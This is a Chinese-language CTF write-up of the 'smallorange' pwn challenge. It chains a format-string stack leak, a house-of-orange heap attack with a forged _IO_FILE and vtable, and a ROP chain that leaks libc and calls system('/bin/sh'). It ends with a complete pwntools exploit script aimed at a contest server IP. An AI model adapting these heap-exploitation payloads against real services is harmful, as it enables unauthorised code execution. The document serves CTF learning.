[CTF-All-In-One](https://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.8_heap_exploit_3.md#house_of_orange)
[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/)
这个操作的关键点：
一、要能实现堆溢出，修改下一个chunk的size
二、要知道_IO_list_all的地址，并且能够修改内容
三、引发报错
首先我们通过unsorted bin attack，将_IO_list_all指向 unsorted bin-0x10的位置
由于我们并不知道_IO_list_all的真实地址，所以得靠猜，我们可以通过libc.sym[“
_IO_list_all”]获得末三位的偏移：520，这三位是不会发生改变的，因此我们可以通过输入`\x10\x55`来实现爆破,其中\x55可以为\x05~\xf5  
有十六分之一的概率能覆盖成功
第一步：
首先申请四个chunk（chunk1、3是为了防止相邻合并）
free掉chunk0、chunk2
这时 unsorted bin 
这时由于chunk2的size被改成了0x61，因此在small bin[5]的地方，也就是
而这个偏移的位置，正好对应了_IO_list_all中的chain，也就通过这个chain，指向了下一个 _IO_FILE
也就是说下一个 _IO_FILE的内容构造可以受我们控制，因为他就在chunk2里面
于是我们只要往chunk2里面存放我们提前构造好的 _IO_FILE结构，就可以实现house of orange的操作
通过构造我们使得，chunk2 中的 _IO_FILE为：
我们知道，_IO_FILE中的各种利用，无非就是通过各种结构体的某个成员进行构造，然后实现跳转执行函数
在house of orange中，最终要实现的就是调用_IO_OVERFLOW (fp, EOF) == EOF)
而_IO_OVERFLOW存在于vtable中，所以我们还得构造一个vtable，而在这一系列的利用中，还得避开很多的检查机制，总结如下：
绕过检查的三个条件
  1. fp->mode大于0
  2. fp->_IO_vtable_offset 等于0
  3. fp->_wide_data->_IO_write_ptr 大于 fp->IO_wide_data->IO_write_base
通过精心构造：
最终实现调用_IO_OVERFLOW (fp, EOF) ==
EOF)，实际上是调用edit（stack），那么fp的第一项也就是flags成员存储的就是stack的地址
* * *
实现了调用edit（stack）
接下来就是构造一大条rop链
那我们得先找gadget，这几个gadget也是有点东西，主要用了以下几条：
    pop_rdi = 0x400ca3
    pop_gadget =0x400c9a
    #pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    mov_gadget = 0x400c80
    #mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
是的，就是两个经典的gadget
算是比较骚的rop构造方式，也很值得学习
构造rop，实现一个libc的泄漏，然后再执行system(/bin/sh)
或者直接跳onegadget也行
最后exp如下
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./smallorange"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    if sys.argv[1] == "r":
        libc = ELF("./libc-2.23.so")
        p = remote("101.71.29.5",10008)
    elif sys.argv[1] == "l":
        libc = elf.libc
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc():
        return p.recv()
    def sp():
        print "---------暂停中---------"
        return raw_input()
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def getshell():
        p.interactive()
    #-------------------------------------    def new(text):
        p.recvuntil('choice: ')
        p.sendline('1')
        p.recvuntil('text:\n')
        p.send(text)
    def old(index):
        p.recvuntil('choice: ')
        p.sendline('2')
        p.recvuntil('index:\n')
        p.sendline(str(index))
    while True:
        try:
            p = process(bin_elf)
            #gdb.attach(p,"b *0x400A67")
            payload ="a"*0x22 +"a%19$n"
            sda(p,"hahaha,come to hurt by ourselves\n",payload)
            ru("a"*0x23)
            stack =u64(p.recv(6).ljust(8,"\x00"))-0x549
            print "leak stack---->",hex(stack)
            ru("addr:0x")
            heap = int(p.recv(7),16)+0x320#指向chunk2
            print "heap stack---->",hex(heap)
            new("a"*0xa0)#chunk0
            new("b"*0xa0)#chunk1
            edit = 0x400b59
            #伪造io file
            payload1=p64(0x0)*2
            payload1+=p64(0x0)*2  
            payload1+=p64(0x0)+p64(0x0)
            payload1+=p64(0x1)+p64(edit)#覆盖overflow
            payload1+=p64(0x0)*2
            payload1+=p64(0x0)*2
            payload1+=p64(0x0)*2
            payload1+=p64(0x0)*2
            payload1+=p64(0x0)*2
            payload1+=p64(heap+0x20)+p64(0x0)#覆盖wide_data
            payload1+=p64(0x0)*2
            payload1+=p64(0x01)+p64(0x0)
            payload1+=p64(0x0)+p64(heap+0x30)#覆盖vtable #0xd8
            new(payload1)#chunk2
            new("d"*0xa0)#chunk3
            old(0)
            old(2)
            #sp()
            print "_IO_list_all:",hex(libc.sym["_IO_list_all"])
            #_IO_list_all的末三位偏移为520,覆盖为_IO_list_all-0x10
            #因此输入"\x10\x55",其中\x55可以为\x05~\xf5
            #有十六分之一的概率能覆盖成功
            #gdb.attach(p)
            #sp()
            payload2="a"*0x210#溢出chunk0至chunk2
            payload2+=p64(stack)+p64(0x61)#改chunk2的pre_size和size
            payload2+=p64(0x0)+'\x10\xa5'#改bk为_IO_list_all-0x10
            #sp()
            #raw_input('go')
            new(payload2)
            #sp()
            #如果成功通过house of orange改变了程序流程,那么会执行edit函数
            ru('choice: ')
            sl('1')#触发报错
            #sp()
            ru('index:')
            sl('0')#执行edit()函数
            sleep(0.5)
            pop_rdi = 0x400ca3
            pop_gadget =0x400c9a
            #pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
            mov_gadget = 0x400c80
            #mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
            payload3='1'*8
            payload3+=p64(pop_gadget)
            payload3+=p64(0x0)#rbx
            payload3+=p64(0x1)#rbp
            payload3+=p64(elf.got["write"])#r12-->write_got
            payload3+=p64(0x8)#r13
            payload3+=p64(elf.got["puts"])#r14-->puts_got
            payload3+=p64(0x1)#r15
            payload3+=p64(mov_gadget)#write(1,puts_got,8)
            #add     rbx, 1
            #cmp     rbx, rbp
            #jnz     short loc_400C80
            #此处rbx=rbp因此不跳转,继续往下执行
            payload3+='1'*8#add rsp,8 
            payload3+=p64(0x0)#pop rbx 
            payload3+=p64(0x1)#pop rbp 
            payload3+=p64(elf.got["read"])#pop r12-->read_got
            payload3+=p64(0x100)#pop r13
            payload3+=p64(stack+0x80)#pop r14
            payload3+=p64(0x0)#pop r15
            payload3+=p64(mov_gadget)#retn-->read(0,stack+0x80,0x100)
            sd(payload3)
            leak=ru('\x7f')
            free=u64(leak[-6:]+'\x00'*2)
            print "puts is----->",hex(free)
            libc_base = free-libc.sym["puts"]
            one = libc_base+0xf02a4
            print "libc_base is----->",hex(libc_base)
            system = libc_base+libc.sym["system"]
            #payload4=p64(one)
            payload4=p64(pop_rdi)#pop rdi ret
            payload4+=p64(stack+0x98)
            payload4+=p64(system)
            payload4+='/bin/sh\x00'
            sl(payload4)
            print 'get a shell'
            break
        except :
            p.close()
            print "fail!continue!-----------------"
    getshell()
终于把这题分析完了，可以看到从格式化字符串到house of
orange到ROP，知识点一环扣一环，其中还有很多艰辛的苦逼调试的过程，学习了很多，这题的质量真的可以
我大哥[1mpossible](http://myhackerworld.top/2018/12/26/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9B-pwn/)，还记载了另一种非预期解法，也非常值得学习，有兴趣的可以看看